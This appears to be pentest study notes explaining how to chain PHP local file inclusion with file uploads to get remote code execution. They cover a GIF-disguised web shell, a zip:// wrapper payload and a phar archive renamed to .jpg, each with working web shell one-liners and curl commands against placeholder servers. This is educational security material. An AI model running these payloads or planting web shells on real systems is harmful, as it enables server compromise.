### LFI and File Uploads
***
#### In some cases we may chain LFI and File Upload attacks together to gain RCE. For instance, if we are able to upload a file and the given function has code Execute capabilities, then we could execute the code within the file regardless of the file extension or type.

### Crafting Malicious Image
#### Firstly, we create our malicious image which contains a PHP web shell script but still it appears as an image. We should also include the image magic bytes at the start of the file as some filters check for both extension and content type.
```bash
$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > webs.gif
```
#### **Note:** When using other image extensions, which its magic bytes are in binary we would need toURL encode it.
#### Then we simply upload our malicious image.

#### Lastly, we would need to find the corresponding uploaded file path and include it through the LFI vulnerability.
```bash
$ curl -s 'http://<SERVER>:<PORT>/index.php?lang=./uploads/webs.gif&cmd=whoami
```

### Zip Upload
#### In PHP, we can use the [zip]( ) wrapper to execute PHP code when it is enabled.
#### We start by crafting our web shell script and zipping it into a zip archive
```bash
$ echo '<?php system($_GET["cmd"]); ?>' > webs.php && zip webs.jpg webs.php
```
#### After uploading the webs.jpg archive, we can include it with the zip wrapper `zip://webs.jpg` and select our desired file with a `#` URL encoded.
```bash
$ curl -s 'http://<SERVER>:<PORT>/index.php?lang=zip://./uploads/webs.jpg%23webs.php&cmd=whoami
```

### Phar Upload
#### We may also use the `phar://` wrapper for the same purpose. First we would need to write the following PHP script into a `webs.php` file:
```php
<?php
$phar = new Phar('webs.phar');
$phar->startBuffering();
$phar->addFromString('webs.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

#### The script above when compiled into a `phar` file would write a web shell to a webs.txt file when executed.
#### Then we compile it into a `phar` file and rename it to `webs.jpg`:
```bash
$ php --define phar.readonly=0 webs.php && mv webs.phar webs.jpg
```